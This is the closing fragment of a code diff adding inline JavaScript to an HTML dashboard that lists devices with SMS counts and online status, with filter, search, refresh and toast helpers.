+        container.scrollTop = 0;
+    }
+
+    function updateDeviceCardSmsCount(deviceId) {
+        const cards = document.querySelectorAll('.device-card');
+        cards.forEach(card => {
+            if (card.dataset.deviceId === deviceId) {
+                const countSpan = card.querySelector('.sms-count');
+                if (countSpan && allUsers[deviceId]) {
+                    countSpan.textContent = getSmsCount(allUsers[deviceId]);
+                }
+            }
+        });
+    }
+
+    function updateStats() {
+        const ids = Object.keys(allUsers);
+        let online = 0;
+        let totalSms = 0;
+
+        ids.forEach(id => {
+            if (isOnline(allUsers[id])) online++;
+            totalSms += getSmsCount(allUsers[id]);
+        });
+
+        document.getElementById('onlineCount').textContent = online;
+        document.getElementById('smsCount').textContent = totalSms;
+    }
+
+    // ===== FILTERS =====
+    function setFilter(filter) {
+        currentFilter = filter;
+        document.querySelectorAll('.toggle-group button').forEach(b => b.classList.remove('active'));
+        if (filter === 'all') document.getElementById('allToggle').classList.add('active');
+        else document.getElementById('onlineToggle').classList.add('active');
+        renderDevices();
+    }
+
+    function filterDevices() {
+        searchQuery = document.getElementById('searchInput').value;
+        renderDevices();
+    }
+
+    function manualRefresh() {
+        showToast('🔄 Refreshing data...');
+        fetchAllData();
+    }
+
+    // ===== INIT =====
+    document.addEventListener('DOMContentLoaded', () => {
+        fetchAllData();
+    });
+
+    // Make functions global
+    window.copyToClipboard = copyToClipboard;
+    window.selectDevice = selectDevice;
+    window.setFilter = setFilter;
+    window.filterDevices = filterDevices;
+    window.manualRefresh = manualRefresh;
+    window.showToast = showToast;
+</script>
 </body>
 </html>
